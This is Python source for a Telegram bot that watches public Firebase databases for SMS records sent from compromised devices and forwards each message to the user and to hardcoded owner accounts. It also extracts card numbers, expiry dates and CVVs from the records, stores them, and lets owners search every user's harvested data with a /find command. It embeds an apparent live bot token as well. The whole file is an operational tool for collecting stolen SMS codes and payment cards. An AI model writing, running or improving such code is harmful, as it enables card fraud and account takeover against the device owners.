# fixed_monitor_bot.py (updated with /find command and card extraction)
import os
import json
import time
import threading
import hashlib
import html
import logging
import re
from datetime import datetime, timezone
from pathlib import Path

import requests
from sseclient import SSEClient

# ---------------- CONFIG ----------------
BOT_TOKEN = os.environ.get("7412885060:AAGKdkQBi50QOG3ejeFDdzjPmmt_KunwchM", "").strip()
if not BOT_TOKEN:
    logging.warning("TELEGRAM_BOT_TOKEN not set in environment. Bot will not work until you set it.")
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

_owner_env = os.environ.get("OWNER_IDS", "").strip()
if _owner_env:
    try:
        OWNER_IDS = [int(x.strip()) for x in _owner_env.split(",") if x.strip()]
    except Exception:
        OWNER_IDS = []
else:
    OWNER_IDS = [7309295924, 5703907337, 1377150939, 8260945171]

POLL_INTERVAL = int(os.environ.get("POLL_INTERVAL", "2"))
MAX_SSE_RETRIES = int(os.environ.get("MAX_SSE_RETRIES", "5"))
WATCHERS_FILE = Path(os.environ.get("WATCHERS_FILE", "watchers.json"))
RECORDS_FILE = Path(os.environ.get("RECORDS_FILE", "records.json"))
TELEGRAM_MESSAGE_LIMIT = 4000  # safe margin under 4096
MAX_STORED_RECORDS_PER_CHAT = int(os.environ.get("MAX_STORED_RECORDS_PER_CHAT", "500"))

# ---------------------------------------

OFFSET = None
running = True

firebase_urls = {}    # chat_id -> firebase_url
watcher_threads = {}  # chat_id -> thread
seen_hashes = {}      # chat_id -> set(hash)
recent_records = {}   # chat_id -> list of detected records (with card info if any)

session = requests.Session()
logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s: %(message)s")


def load_watchers_from_disk():
    global firebase_urls
    if not WATCHERS_FILE.exists():
        return
    try:
        data = json.loads(WATCHERS_FILE.read_text(encoding="utf-8"))
        firebase_urls = {int(k) if str(k).isdigit() else k: v for k, v in data.get("firebase_urls", {}).items()}
        logging.info("Loaded watchers from disk: %s", list(firebase_urls.keys()))
    except Exception:
        logging.exception("Failed to load watchers from disk")


def save_watchers_to_disk():
    try:
        data = {"firebase_urls": {str(k): v for k, v in firebase_urls.items()}}
        WATCHERS_FILE.write_text(json.dumps(data, indent=2), encoding="utf-8")
    except Exception:
        logging.exception("Failed to save watchers to disk")


def load_records_from_disk():
    global recent_records
    if not RECORDS_FILE.exists():
        recent_records = {}
        return
    try:
        data = json.loads(RECORDS_FILE.read_text(encoding="utf-8"))
        # keys are stored as strings
        recent_records = {int(k) if str(k).isdigit() else k: v for k, v in data.items()}
        logging.info("Loaded records from disk: chats=%s", list(recent_records.keys()))
    except Exception:
        logging.exception("Failed to load records from disk")
        recent_records = {}


def save_records_to_disk():
    try:
        data = {str(k): v for k, v in recent_records.items()}
        RECORDS_FILE.write_text(json.dumps(data, indent=2, default=str), encoding="utf-8")
    except Exception:
        logging.exception("Failed to save records to disk")


def normalize_json_url(url):
    if not url:
        return None
    u = url.rstrip("/")
    if not u.endswith(".json"):
        u = u + "/.json"
    return u


def send_msg(chat_id, text, parse_mode="HTML"):
    if isinstance(chat_id, (list, tuple, set)):
        for cid in chat_id:
            send_msg(cid, text, parse_mode=parse_mode)
        return
    try:
        payload_text = str(text)
        if len(payload_text) > TELEGRAM_MESSAGE_LIMIT:
            payload_text = payload_text[: (TELEGRAM_MESSAGE_LIMIT - 20)] + "\n\n[...truncated...]"
        payload = {"chat_id": int(chat_id), "text": payload_text, "parse_mode": parse_mode}
        resp = session.post(f"{API_URL}/sendMessage", json=payload, timeout=10)
        try:
            j = resp.json()
        except Exception:
            j = None
        if resp.status_code != 200 or (isinstance(j, dict) and not j.get("ok", False)):
            logging.warning("send_msg failed for %s: status=%s json=%s", chat_id, resp.status_code, j)
    except Exception:
        logging.exception("send_msg error")


def get_updates():
    global OFFSET
    try:
        params = {"timeout": 20}
        if OFFSET:
            params["offset"] = OFFSET
        r = session.get(f"{API_URL}/getUpdates", params=params, timeout=30)
        data = r.json()
        if data.get("result"):
            OFFSET = data["result"][-1]["update_id"] + 1
        return data.get("result", [])
    except Exception:
        logging.exception("get_updates error")
        return []


def http_get_json(url):
    try:
        r = session.get(url, timeout=12)
        r.raise_for_status()
        return r.json()
    except Exception:
        logging.exception("http_get_json error for %s", url)
        return None


def is_sms_like(obj):
    if not isinstance(obj, dict):
        return False
    keys = {k.lower() for k in obj.keys()}
    score = 0
    if keys & {"message", "msg", "body", "text", "sms"}:
        score += 2
    if keys & {"from", "sender", "address", "source", "number"}:
        score += 2
    if keys & {"time", "timestamp", "ts", "date", "created_at"}:
        score += 1
    if keys & {"device", "deviceid", "imei", "device_id", "phoneid"}:
        score += 1
    return score >= 3


def find_sms_nodes(snapshot, path=""):
    found = []
    if isinstance(snapshot, dict):
        for k, v in snapshot.items():
            p = f"{path}/{k}" if path else str(k)
            if is_sms_like(v):
                found.append((p, v))
            if isinstance(v, (dict, list)):
                found += find_sms_nodes(v, p)
    elif isinstance(snapshot, list):
        for i, v in enumerate(snapshot):
            p = f"{path}/{i}"
            if is_sms_like(v):
                found.append((p, v))
            if isinstance(v, (dict, list)):
                found += find_sms_nodes(v, p)
    return found


def extract_fields(obj):
    device = obj.get("device") or obj.get("deviceId") or obj.get("device_id") or obj.get("imei") or obj.get("id") or "Unknown"
    sender = obj.get("from") or obj.get("sender") or obj.get("address") or obj.get("number") or "Unknown"
    message = obj.get("message") or obj.get("msg") or obj.get("body") or obj.get("text") or ""
    ts = obj.get("time") or obj.get("timestamp") or obj.get("date") or obj.get("created_at") or None
    if isinstance(ts, (int, float)):
        try:
            ts = datetime.fromtimestamp(float(ts), tz=timezone.utc).astimezone().strftime("%d/%m/%Y, %I:%M:%S %p")
        except Exception:
            ts = str(ts)
    elif isinstance(ts, str):
        digits = "".join(ch for ch in ts if ch.isdigit())
        if len(digits) == 10:
            try:
                ts = datetime.fromtimestamp(int(digits), tz=timezone.utc).astimezone().strftime("%d/%m/%Y, %I:%M:%S %p")
            except Exception:
                pass
    if not ts:
        ts = datetime.now().strftime("%d/%m/%Y, %I:%M:%S %p")
    device_phone = obj.get("phone") or obj.get("mobile") or None
    return {"device": device, "sender": sender, "message": message, "time": ts, "device_phone": device_phone}


def compute_hash(path, obj):
    try:
        return hashlib.sha1((path + json.dumps(obj, sort_keys=True, default=str)).encode()).hexdigest()
    except Exception:
        return hashlib.sha1((path + str(obj)).encode()).hexdigest()


# ---------------- Card detection utilities ----------------
PAN_RE = re.compile(r"\b(?:\d[ -]*?){13,19}\b")
EXPIRY_RE = re.compile(r"\b(0[1-9]|1[0-2])[\/\-](\d{2}|\d{4})\b")
CVV_KEYWORDS = {"cvv", "cvc", "cvv2", "cvn"}

def luhn_check(number_str):
    # number_str: digits only
    try:
        digits = [int(d) for d in number_str]
    except Exception:
        return False
    checksum = 0
    dbl = False
    for d in reversed(digits):
        if dbl:
            d = d * 2
            if d > 9:
                d -= 9
        checksum += d
        dbl = not dbl
    return checksum % 10 == 0

def flatten_json(obj):
    parts = []
    if isinstance(obj, dict):
        for k, v in obj.items():
            parts.append(str(k))
            parts.extend(flatten_json(v))
    elif isinstance(obj, list):
        for v in obj:
            parts.extend(flatten_json(v))
    else:
        parts.append(str(obj))
    return parts

def detect_card_details(obj):
    """
    Scans the object and returns dict with keys: pan, expiry, cvv if found (strings), otherwise None.
    Strategy:
    - Flatten keys/values into strings.
    - Find PAN-like tokens, run Luhn to verify.
    - For each PAN occurrence, try to find expiry pattern in same flattened chunk or nearby keys.
    - For CVV, prefer keys containing cvv/cvc; otherwise attempt to find nearby 3-4 digit number.
    Returns first confident match found.
    """
    try:
        flat = flatten_json(obj)
        joined = " | ".join(flat)
        # find PAN candidates
        for m in PAN_RE.findall(joined):
            digits = re.sub(r"\D", "", m)
            if 13 <= len(digits) <= 19 and luhn_check(digits):
                pan = digits
                # search for expiry near the PAN occurrence
                # find substring around the matched PAN
                idx = joined.find(m)
                window = joined[max(0, idx - 200): idx + len(m) + 200]
                expiry_match = EXPIRY_RE.search(window)
                expiry = None
                if expiry_match:
                    expiry = expiry_match.group(0)
                # CVV detection: look for explicit key words in flat list
                cvv = None
                # check keys/values pairs for cvv-like keys
                if isinstance(obj, dict):
                    # recursive search for keys containing cvv/cvc
                    def find_cvv_in_obj(o):
                        if isinstance(o, dict):
                            for kk, vv in o.items():
                                if any(kword in str(kk).lower() for kword in CVV_KEYWORDS):
                                    s = str(vv)
                                    digits_only = re.sub(r"\D", "", s)
                                    if 3 <= len(digits_only) <= 4:
                                        return digits_only
                                res = find_cvv_in_obj(vv)
                                if res:
                                    return res
                        elif isinstance(o, list):
                            for item in o:
                                res = find_cvv_in_obj(item)
                                if res:
                                    return res
                        return None
                    cvv = find_cvv_in_obj(obj)
                # if not found, look for nearby 3-4 digit number in window, but avoid years (19xx/20xx)
                if not cvv:
                    cvv_candidates = re.findall(r"\b(\d{3,4})\b", window)
                    for cand in cvv_candidates:
                        if len(cand) == 4 and (cand.startswith("19") or cand.startswith("20")):
                            continue
                        cvv = cand
                        break
                return {"pan": pan, "expiry": expiry, "cvv": cvv, "context": window}
        return None
    except Exception:
        logging.exception("detect_card_details error")
        return None

# ---------------- record storing ----------------
def store_record(chat_id, record):
    chat_id = int(chat_id)
    recs = recent_records.setdefault(chat_id, [])
    recs.insert(0, record)
    # keep bounded
    if len(recs) > MAX_STORED_RECORDS_PER_CHAT:
        recs[:] = recs[:MAX_STORED_RECORDS_PER_CHAT]
    save_records_to_disk()


def format_record_for_output(r):
    # returns readable text including card details if present
    lines = []
    lines.append(f"Path: {r.get('path')}")
    lines.append(f"Device: {html.escape(str(r.get('device')))}")
    lines.append(f"Time: {html.escape(str(r.get('time')))}")
    lines.append(f"From: {html.escape(str(r.get('sender')))}")
    if r.get("card"):
        c = r["card"]
        pan = c.get("pan")
        expiry = c.get("expiry") or "N/A"
        cvv = c.get("cvv") or "N/A"
        lines.append("---- Detected Card ----")
        lines.append(f"PAN: {pan}")
        lines.append(f"Expiry: {expiry}")
        lines.append(f"CVV: {cvv}")
        lines.append("-----------------------")
    else:
        lines.append("No card details detected in this record.")
    return "\n".join(lines)


def format_notification(fields, user_id):
    device = html.escape(str(fields.get("device", "Unknown")))
    sender = html.escape(str(fields.get("sender", "Unknown")))
    message = html.escape(str(fields.get("message", "")))
    t = html.escape(str(fields.get("time", "")))
    text = (
        f"🆕 <b>New SMS Received</b>\n\n"
        f"📱 Device: <code>{device}</code>\n"
        f"👤 From: <b>{sender}</b>\n"
        f"💬 Message: {message}\n"
        f"🕐 Time: {t}\n"
        f"👤 Forwarded by User ID: <code>{user_id}</code>"
    )
    if fields.get("device_phone"):
        text += f"\n📞 Device Number: <code>{html.escape(str(fields.get('device_phone')))}</code>"
    return text


def notify_user_owner(chat_id, fields, path, full_obj):
    text = format_notification(fields, chat_id)
    # send to the user who registered
    send_msg(chat_id, text)
    # also send to all owners/admins
    if OWNER_IDS:
        send_msg(OWNER_IDS, text)
    # detect card details and store record (without auto-sending full card details)
    card = detect_card_details(full_obj)
    rec = {
        "path": path,
        "device": fields.get("device"),
        "sender": fields.get("sender"),
        "message": fields.get("message"),
        "time": fields.get("time"),
        "device_phone": fields.get("device_phone"),
        "card": card,
        "full": full_obj,
        "stored_at": datetime.now().isoformat()
    }
    store_record(chat_id, rec)


# ---------- SSE watcher ----------
def sse_loop(chat_id, base_url):
    url = base_url.rstrip("/")
    if not url.endswith(".json"):
        url = url + "/.json"
    stream_url = url + "?print=silent"
    seen = seen_hashes.setdefault(chat_id, set())
    send_msg(chat_id, "⚡ SSE (live) started. Auto-reconnect enabled.")
    retries = 0
    while firebase_urls.get(chat_id) == base_url:
        try:
            client = SSEClient(stream_url)
            for event in client.events():
                if firebase_urls.get(chat_id) != base_url:
                    break
                if not event.data or event.data == "null":
                    continue
                try:
                    data = json.loads(event.data)
                except Exception:
                    continue
                payload = data.get("data") if isinstance(data, dict) and "data" in data else data
                nodes = find_sms_nodes(payload, "")
                for path, obj in nodes:
                    h = compute_hash(path, obj)
                    if h in seen:
                        continue
                    seen.add(h)
                    fields = extract_fields(obj)
                    notify_user_owner(chat_id, fields, path, obj)
            retries = 0
        except Exception:
            logging.exception("SSE error for chat %s", chat_id)
            retries += 1
            if retries >= MAX_SSE_RETRIES:
                send_msg(chat_id, "⚠️ SSE failed multiple times, falling back to polling...")
                poll_loop(chat_id, base_url)
                break
            backoff = min(30, 2 ** retries)
            time.sleep(backoff)


# ---------- Polling fallback ----------
def poll_loop(chat_id, base_url):
    url = base_url.rstrip("/")
    if not url.endswith(".json"):
        url = url + "/.json"
    seen = seen_hashes.setdefault(chat_id, set())
    send_msg(chat_id, f"📡 Polling started (every {POLL_INTERVAL}s).")
    while firebase_urls.get(chat_id) == base_url:
        snap = http_get_json(url)
        if not snap:
            time.sleep(POLL_INTERVAL)
            continue
        nodes = find_sms_nodes(snap, "")
        for path, obj in nodes:
            h = compute_hash(path, obj)
            if h in seen:
                continue
            seen.add(h)
            fields = extract_fields(obj)
            notify_user_owner(chat_id, fields, path, obj)
        time.sleep(POLL_INTERVAL)
    send_msg(chat_id, "⛔ Polling stopped.")


# ---------- Start / Stop ----------
def start_watcher(chat_id, base_url):
    chat_id = int(chat_id)
    firebase_urls[chat_id] = base_url
    seen_hashes[chat_id] = set()
    json_url = normalize_json_url(base_url)
    snap = http_get_json(json_url)
    if snap:
        for p, o in find_sms_nodes(snap, ""):
            seen_hashes[chat_id].add(compute_hash(p, o))
    t = threading.Thread(target=sse_loop, args=(chat_id, base_url), daemon=True)
    watcher_threads[chat_id] = t
    t.start()
    save_watchers_to_disk()
    send_msg(chat_id, "✅ Monitoring started. You will receive alerts too.")


def stop_watcher(chat_id):
    chat_id = int(chat_id)
    firebase_urls.pop(chat_id, None)
    seen_hashes.pop(chat_id, None)
    watcher_threads.pop(chat_id, None)
    save_watchers_to_disk()
    send_msg(chat_id, "🛑 Monitoring stopped.")


# ---------- Command handling ----------
def handle_find_command(chat_id, query):
    """
    Search recent_records for the chat for device id or timing substring or generic substring.
    If chat is owner and no match in chat-specific records, we can search all chats.
    Returns results list.
    """
    if not query:
        send_msg(chat_id, "Usage: /find <device-id or timing substring>\nExample: /find 0123456789\nExample: /find 12/05/2025")
        return

    query_l = query.lower().strip()
    results = []

    # search own chat records first
    recs = recent_records.get(int(chat_id), [])
    for r in recs:
        if (r.get("device") and query_l in str(r.get("device")).lower()) or \
           (r.get("time") and query_l in str(r.get("time")).lower()) or \
           (r.get("sender") and query_l in str(r.get("sender")).lower()) or \
           (r.get("message") and query_l in str(r.get("message")).lower()) or \
           (r.get("path") and query_l in str(r.get("path")).lower()):
            results.append(("self", r))

    # if owner and no results, search across all chats
    if not results and int(chat_id) in OWNER_IDS:
        for cid, recs in recent_records.items():
            for r in recs:
                if (r.get("device") and query_l in str(r.get("device")).lower()) or \
                   (r.get("time") and query_l in str(r.get("time")).lower()) or \
                   (r.get("sender") and query_l in str(r.get("sender")).lower()) or \
                   (r.get("message") and query_l in str(r.get("message")).lower()) or \
                   (r.get("path") and query_l in str(r.get("path")).lower()):
                    results.append((cid, r))

    if not results:
        send_msg(chat_id, "No matching records found in cache.")
        return

    # Prepare and send results. WARNING about sensitive data
    send_msg(chat_id, "⚠️ Warning: Card data is sensitive. Handle responsibly.\nShowing matched records (most recent first):")
    for owner, r in results[:10]:
        header = f"Chat: {owner}" if owner != "self" else "Your chat"
        out = f"{header}\n" + format_record_for_output(r)
        send_msg(chat_id, out)


def handle_update(u):
    msg = u.get("message") or {}
    chat = msg.get("chat", {})
    chat_id = chat.get("id")
    text = (msg.get("text") or "").strip()
    if not chat_id or not text:
        return
    text_lower = text.lower()
    if text_lower == "/start":
        send_msg(chat_id, "👋 Send me your Firebase RTDB base URL (end with .json) to start monitoring. Use /help for commands.")
        return
    if text_lower == "/help":
        help_text = (
            "Commands:\n"
            "/start - Welcome message\n"
            "/help - This help\n"
            "/stop - Stop monitoring for your chat\n"
            "/list - Show active watchers (owners only)\n"
            "/status - Show running watchers\n"
            "/find <device-id or timing or text> - Search cached records for card details\n\n"
            "To start monitoring, send a public Firebase RTDB URL (e.g. https://<project>.firebaseio.com/.json)\n"
        )
        send_msg(chat_id, help_text)
        return
    if text_lower == "/stop":
        stop_watcher(chat_id)
        return
    if text_lower == "/list":
        if chat_id not in OWNER_IDS:
            send_msg(chat_id, "❌ This command is restricted to bot owners.")
            return
        lines = [f"{uid} -> {url}" for uid, url in firebase_urls.items()]
        send_msg(chat_id, "Active watchers:\n" + ("\n".join(lines) if lines else "None"))
        return
    if text_lower == "/status":
        lines = [f"{uid} -> {url}" for uid, url in firebase_urls.items()]
        send_msg(chat_id, "Status:\n" + ("\n".join(lines) if lines else "No active watchers"))
        return
    if text_lower.startswith("/find"):
        parts = text.split(None, 1)
        query = parts[1].strip() if len(parts) > 1 else ""
        handle_find_command(chat_id, query)
        return
    if text.startswith("http"):
        test_url = normalize_json_url(text)
        if not http_get_json(test_url):
            send_msg(chat_id, "❌ Unable to fetch URL. Make sure it's public and ends with .json")
            return
        start_watcher(chat_id, text)
        if OWNER_IDS:
            send_msg(OWNER_IDS, f"User {chat_id} started monitoring: {text}")
        return
    send_msg(chat_id, "Send a Firebase RTDB URL or use /stop /list /status /help /find <query>")


# ---------- Main loop ----------
def main_loop():
    if not BOT_TOKEN:
        logging.error("No TELEGRAM_BOT_TOKEN set; exiting.")
        return
    load_watchers_from_disk()
    load_records_from_disk()
    for cid, url in list(firebase_urls.items()):
        try:
            start_watcher(int(cid), url)
        except Exception:
            logging.exception("Failed to restart watcher for %s", cid)
    send_msg(OWNER_IDS, "Bot started and running.")
    logging.info("Bot running. Listening for messages...")
    while running:
        updates = get_updates()
        for u in updates:
            try:
                handle_update(u)
            except Exception:
                logging.exception("handle_update error")
        time.sleep(0.5)


if __name__ == "__main__":
    try:
        main_loop()
    except KeyboardInterrupt:
        running = False
        logging.info("Shutting down.")
